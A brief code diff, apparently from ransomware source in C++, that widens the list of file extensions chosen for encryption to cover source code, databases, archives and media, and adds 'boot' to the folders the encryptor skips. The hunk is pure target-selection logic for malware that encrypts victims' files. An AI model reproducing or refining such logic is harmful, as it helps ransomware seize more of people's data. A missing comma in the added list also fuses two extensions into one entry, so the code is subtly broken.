@@ -33,8 +33,11 @@ bool do_encrypt(const string& path)
 {
 	static std::unordered_set<string> ext_whitelist = {
 		"pdf", "odt", "docx", "pptx", "txt",
+		"ppt", "doc", "xml", "csv", "java"
 		"mov", "zip", "jpg", "jpeg", "xls",
-		"doc", 	"ppt", "gif", "png", "xlsx"
+		"doc", 	"ppt", "gif", "png", "xlsx",
+		"cpp", "c", "sql", "wav", "php", 
+		"mpeg", "jar", "asp"
 	};
 	std::string ext = find_extension(path);
 	return ext_whitelist.find(ext) != ext_whitelist.end();
@@ -48,7 +51,7 @@ bool do_decrypt(const string& path)
 bool is_valid_folder(const string& path)
 {
 	static std::unordered_set<string> unvalid_folder = {
-		"Windows", "Program Files"
+		"Windows", "Program Files", "boot"
 	};
 	for (auto folder : unvalid_folder)
 	{
